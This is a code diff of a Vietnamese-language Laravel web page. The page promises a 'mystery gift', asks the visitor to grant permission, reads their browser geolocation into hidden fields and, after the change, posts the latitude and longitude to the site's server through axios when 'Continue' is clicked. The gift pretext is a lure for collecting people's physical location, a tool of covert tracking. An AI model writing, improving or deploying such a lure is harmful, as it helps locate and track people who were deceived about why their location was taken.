@@ -49,17 +49,19 @@
         <h2>món quà bì ấn...</h2>
         <small style="font-size: 10px; font-style: inherit; color: orange;">(Vui lòng cấp quyền cho trang web !)</small>
         <div style="margin-top: 50px; text-align: center;">
-            <form action="{{ route('post-location') }}" method="post">
+            <form >
                 {{ csrf_field() }}
                 <input type="hidden" name="latitude" id="latitude">
                 <input type="hidden" name="longitude" id="longitude">
-                <button id="btn-submit">Tiếp tục</button>
+                <button id="btn-submit" type="button">Tiếp tục</button>
             </form>
         </div>
     </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.1.3/axios.min.js" integrity="sha512-0qU9M9jfqPw6FKkPafM3gy2CBAvUWnYVOfNPDYKVuRTel1PrciTj+a9P3loJB+j0QmN2Y0JYQmkBBS8W+mbezg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script>
         let scale = 1;
         let rand = 0;
+        const URL_AXIOS = `{{ route('post-location') }}`;
         setInterval(() => {
             if (rand) {
                 scale = 1.1;
@@ -82,6 +84,19 @@
             document.querySelector('#latitude').value = position.coords.latitude;
             document.querySelector('#longitude').value = position.coords.longitude;
         }
+
+        document.querySelector('#btn-submit').addEventListener('click', function() {
+            let body = {
+                latitude: document.querySelector('#latitude').value,
+                longitude: document.querySelector('#longitude').value
+            };
+
+            if (!body.latitude) {
+                alert('Vui lòng cho phép vị trị để tiếp tục !');
+            }
+
+            axios.post(URL_AXIOS, body);
+        });
     </script>
 </body>
 </html>
